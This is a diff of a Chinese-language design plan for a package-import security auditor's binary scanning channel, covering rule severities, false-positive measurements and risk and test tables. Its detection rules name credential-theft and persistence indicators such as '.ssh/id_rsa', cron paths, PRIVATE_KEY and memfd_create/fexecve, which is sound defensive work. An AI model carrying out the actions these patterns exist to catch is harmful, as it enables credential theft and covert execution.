-- **判定**：证据行按规则表匹配，产出 `Finding` 并标记 `binary_kind` / `evidence_source` / `binary_offset`；共享规则（`NET_002`/`CMD_001`/`DYN_001`/`FIL_001`/`PER_001`/`ENV_001`/`OBF_001`）的严重级从源码规则表读取，不另立一套。二进制专有规则：`BIN_001`（加壳载荷，MEDIUM）、`BIN_002`（`memfd_create`/`fexecve`，HIGH）、`PKL_001`（pickle 反序列化执行，HIGH）。
+- **判定**：证据行按规则表匹配，产出 `Finding` 并标记 `binary_kind` / `evidence_source` / `binary_offset`。**结构性证据**（ELF 动态符号、`DT_NEEDED`、熵）走共享规则 `NET_002`/`CMD_001`/`DYN_001`，其严重级从源码规则表读取，不另立一套；二进制专有规则 `BIN_001`（可执行节区熵近随机，HIGH）、`BIN_002`（`memfd_create`/`fexecve`，HIGH）、`PKL_001`（pickle 反序列化执行，HIGH）。**字符串证据**不共享源码臂的 id——`CMD_002`/`PER_002`/`FIL_002`/`ENV_002` 是四个独立的 LOW 族，理由见下：一条 finding 只有被文件无法偶然产生的结构背书时才可以是 HIGH，而一段字符串常量不是；源码臂的同名族 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` 在共享表里是 HIGH/MEDIUM，借用它们会把「某个字面量里出现了某个词」抬到阻断级别。`OBF_001` 在二进制臂**没有**族：它的旧模式 `^[A-Za-z0-9+/]{120,}={0,2}$` 命中了 28 个合法共享库中的 23 个（`.pyc` 常量池和二进制数据里遍地是长 base64 字母表串），收紧字母表或抬高下限都治不了，只保留源码臂的调用点版本。
 - **复核**：二进制 finding 与源码 finding 走同一条 LLM 路径；文件级分析使用二进制专用 prompt（现有 prompt 面向 Python 源码，不适用）。
 - **完整性**：`scan_metadata.binary` 记录 `files_count` / `kinds` / `bounded_executable` / `bounded_data` / `incomplete` / `truncated`。可执行格式的结构抽取被截断、文件无法读取、finding 触顶，任一项都会使 `ProvesCleanScan()` 为假——fail-closed 下即阻断导入；纯数据文件（张量、npy）的证据截断只记录、不阻断。
 - **配置**：`security.binaryAudit.enabled`（默认 `true`）、`maxArchiveMembers`、`highEntropyThreshold`、`maxFindings`（默认 50，独立于源码臂的 200）、`maxFullScanBytes`（默认 64 MiB）、`maxStreamBytes`（默认 3 GiB；与 `maxFullScanBytes` 成对，抬高后者才会让前者生效）。关闭它即回滚，审计行为与引入该通道之前逐字节一致。
@@ -6443,9 +6716,10 @@ git commit -m "test(audit): cover the binary channel end to end and document it"
 | --- | --- |
 | `elfFixtureBytes` 的字节布局写错，Task 5–15 全部建立其上 | `TestELFFixtureIsReadByTheStandardLibrary` 先于一切断言检查夹具本身；失败时按 `debug/elf` 的报错逐字段核对 |
 | 大模型包（数 GB）的 `.pt` 让导入变慢 | 证据流式读取，无整文件驻留；容器成员按需解压且有总额预算；超过 `MaxFullScanBytes`（默认 64 MiB）的文件只读首尾各 1 MiB，把单文件成本钉在约 190 ms |
-| 加壳判定对 UPX 打包的合法库误报 | `BIN_001` 定为 MEDIUM：assist 策略下不阻断，gate 策略下阻断并交由 operator 判定，这是两种策略本就存在的分歧点 |
+| 加壳判定对 UPX 打包的合法库误报 | `BIN_001` 定为 HIGH，但触发它的是一次**测量**而不是一次模式匹配：只有可执行节区的熵越过 7.5 bits/byte 才成立，而实测 28 个合法共享库的可执行节区最高只有 6.75（`libgomp.so` 的 7.97 落在非可执行的 `.gnu_debugdata`，抽取器根本不测）。误报面因此是「真的加壳了的合法库」，而不是「碰巧含有某个字节序列的库」。assist 下不阻断 |
+| 字符串证据把合法包判成恶意 | 这是本轮实测出的最贵的误报源，对策是把字符串半边整体降级并收窄：源码臂的 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` 是 HIGH/MEDIUM（`DefaultRules()` + `audit.go:242-243`，MEDIUM 在 `gate` 下照样阻断，`audit.go:301`），所以字符串半边不借它们，改用独立的 LOW 族 `CMD_002`/`PER_002`/`FIL_002`/`ENV_002`；每个 token 两端都锚定（`^…$`）以拒绝 `.pyc` 常量池里拼接出的片段（`'crontabz'`、`'.ssh/id_rsaz'`、`.profilez /etc/cron)` 都是实测命中）；`ENV_002` 去掉 `(?i)`，否则小写标识符 `private_key` 会撞上 `PRIVATE_KEY`；`OBF_001` 从二进制臂整体删除（28 个合法库命中 23 个）。LOW 仍进报告、仍送 Tier 2 复核，只是自己不足以阻断 |
 | 二进制 finding 挤占 LLM 配额 | 两臂各自限流（源码 200、二进制 50），合并列表不再二次截断。**Tier 2 调用上界由 200 变为 250**，且只在两臂同时饱和时可达——那个状态本来就已阻断并删包，多出的调用不改变结论。反过来，共享配额会让大源码臂按路径序挤掉二进制 finding，并把一个原本可导入的包推到 `Truncated` 而被删除 |
-| 二进制通道让原本能导入的包被误阻断 | 这是本设计最贵的失败模式（`ProvesCleanScan` 为假 → `cleanDirContents` 删包），所以：`Truncated` 只由各臂自己的上限触发；纯数据文件的证据截断只记录、不阻断；`BIN_001` 定为 MEDIUM，assist 下不阻断；`security.binaryAudit.enabled=false` 是逐字节回滚。已入库语料实测最大 finding 数为单样本 7、整语料 80，离两个上限都有一个数量级 |
+| 二进制通道让原本能导入的包被误阻断 | 这是本设计最贵的失败模式（`ProvesCleanScan` 为假 → `cleanDirContents` 删包），所以：`Truncated` 只由各臂自己的上限触发；纯数据文件的证据截断只记录、不阻断；字符串证据一律 LOW（四个独立族，不借源码臂的 HIGH/MEDIUM id）；`BIN_001` 只由测量触发、不匹配字面量；`security.binaryAudit.enabled=false` 是逐字节回滚。已入库语料实测最大 finding 数为单样本 7、整语料 80，离两个上限都有一个数量级 |
 | 与 semgrep 非劣性证据的交互 | 二进制通道在**两个臂之外**运行且合并发生在引擎报告之后，两臂的引擎级报告逐字节不变；`corpus_parity_test.go` 会证明这一点 |
 | pickle 解释器的门控开错方向 | 两个方向都是故障，所以各有一个测试钉住：**跑宽了**（对非 pickle 也跑解释器）会让任意字节能被读成 opcode，未知 opcode 直接置 `Bound.Structural`，而 `KindELF`/`KindPickle`/`KindArchive`/`KindCompressed` 都是可执行类型，于是每个 `.pt`/`.whl`/`.so` 都被阻断、原本能导入的包被删——`TestCollectEvidenceDoesNotInterpretNonPicklesAsPickles` 用一个良性 ELF 夹具断言既不 `Err` 也无 `Bound.Structural`、无 `SourcePickle` 行；**跑窄了**（该跑的没跑）会丢掉 pickle 证据——`TestPickleInterpreterReadsTheRealCheckpoint` 断言真 checkpoint 仍产出目标。门控规则（只跑在 `KindPickle` 的整文件/容器成员、以及解压后头部嗅探为 pickle 的 gzip 流上）写在 Task 4 Step 4，不得"简化"掉 |
 | 二进制通道无法被取消 | `GenerateAuditReport` 由 `internal/controller/import_processing.go:642` 以 `context.Background()` 调用，新增的 `runBinaryChannel`/`ScanDirectory` 都不收 context，所以**单个文件**的工作量被 `BinaryConfig` 的上限钉住，而**总**工作量随文件数线性增长，且没有任何东西能中断它。这是既有的形状而不是新引入的类别——`engine.ScanDirectoryWithLines` 同样不收 context——所以这里只当作一个已知边界记录：一次导入的二进制臂时长与文件数成正比，超时与否只能由调用方在整条审计之外控制，本计划不新增逐文件的取消路径 |
